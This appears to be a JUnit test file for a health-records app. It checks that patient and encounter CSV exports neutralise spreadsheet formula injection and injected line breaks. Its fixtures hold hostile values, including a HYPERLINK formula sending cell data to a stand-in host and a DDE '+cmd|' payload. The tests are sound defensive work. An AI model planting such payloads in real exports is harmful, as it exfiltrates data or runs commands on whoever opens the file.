package com.medchart.ehr.legacy;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.test.util.ReflectionTestUtils;

import javax.persistence.EntityManager;
import javax.persistence.Query;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.Date;
import java.sql.Timestamp;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

class CsvExportInjectionTest {

    private static final String FORMULA = "=HYPERLINK(\"http://evil.example/?d=\"&B3,\"Click\")";
    private static final String ROW_BREAK = "Doe\n999,999-99-9999,Fake,Patient";

    @TempDir
    Path tempDir;

    @Test
    void patientRosterKeepsMaliciousNamesAsLiteralTextInOneRow() throws Exception {
        List<Object[]> rows = new ArrayList<>();
        rows.add(new Object[]{BigInteger.ONE, "MRN-1", "123-45-6789", "Mallory", FORMULA,
                Date.valueOf("1980-01-02"), "555-0100", null, "m@example.com",
                "1 Main St, Apt 2", "Springfield", "IL", "62701", "Acme", "-AB123"});
        rows.add(new Object[]{BigInteger.TWO, "MRN-2", "987-65-4321", "Eve", ROW_BREAK,
                Date.valueOf("1990-03-04"), null, null, null, null, null, null, null, null, null});

        ReportGenerator generator = new ReportGenerator();
        ReflectionTestUtils.setField(generator, "entityManager", entityManagerReturning(rows));

        List<List<String>> csv = CsvTestParser.parse(
                new String(generator.generateDailyReport(), StandardCharsets.UTF_8));

        assertEquals(3, csv.size());
        assertEquals("LastName", csv.get(0).get(4));
        List<String> first = csv.get(1);
        assertEquals(15, first.size());
        assertEquals("'" + FORMULA, first.get(4));
        assertEquals("1 Main St, Apt 2", first.get(9));
        assertEquals("'-AB123", first.get(14));
        List<String> second = csv.get(2);
        assertEquals(15, second.size());
        assertEquals("2", second.get(0));
        assertEquals("Doe 999,999-99-9999,Fake,Patient", second.get(4));
    }

    @Test
    void encounterExportKeepsMaliciousNamesAsLiteralTextInOneRow() {
        List<Object[]> rows = new ArrayList<>();
        rows.add(new Object[]{BigInteger.ONE, "ENC-1", "OUTPATIENT", "COMPLETED",
                Timestamp.valueOf("2026-10-01 09:00:00"), "MRN-1", "@SUM(1+1)", ROW_BREAK,
                Date.valueOf("1980-01-02")});

        EncounterExportService service = new EncounterExportService();
        ReflectionTestUtils.setField(service, "entityManager", entityManagerReturning(rows));

        List<List<String>> csv = CsvTestParser.parse(new String(
                service.exportEncountersForDateRange(LocalDate.of(2026, 10, 1), LocalDate.of(2026, 10, 2)),
                StandardCharsets.UTF_8));

        assertEquals(2, csv.size());
        List<String> row = csv.get(1);
        assertEquals(8, row.size());
        assertEquals("'@SUM(1+1) Doe 999,999-99-9999,Fake,Patient", row.get(3));
        assertEquals("COMPLETED", row.get(7));
    }

    @Test
    void allPatientsFileExportKeepsMaliciousNamesAsLiteralTextInOneRow() throws Exception {
        List<Object[]> rows = new ArrayList<>();
        rows.add(new Object[]{BigInteger.ONE, "MRN-1", "+cmd|' /C calc'!A0", ROW_BREAK,
                Date.valueOf("1980-01-02"), "m@example.com", null, null, "1 Main St, Apt 2",
                "Springfield", "IL", "62701"});

        EncounterExportService service = new EncounterExportService();
        ReflectionTestUtils.setField(service, "entityManager", entityManagerReturning(rows));

        Path file = tempDir.resolve("patients.csv");
        service.exportAllPatientsToFile(file.toString());
        List<List<String>> csv = CsvTestParser.parse(Files.readString(file));

        assertEquals(2, csv.size());
        List<String> row = csv.get(1);
        assertEquals(12, row.size());
        assertEquals("'+cmd|' /C calc'!A0", row.get(2));
        assertEquals("Doe 999,999-99-9999,Fake,Patient", row.get(3));
        assertEquals("", row.get(6));
        assertEquals("1 Main St, Apt 2", row.get(8));
    }

    @SuppressWarnings({"rawtypes", "unchecked"})
    private static EntityManager entityManagerReturning(List<Object[]> rows) {
        EntityManager entityManager = mock(EntityManager.class);
        Query query = mock(Query.class);
        when(entityManager.createNativeQuery(anyString())).thenReturn(query);
        when(query.getResultList()).thenReturn((List) rows);
        return entityManager;
    }
}
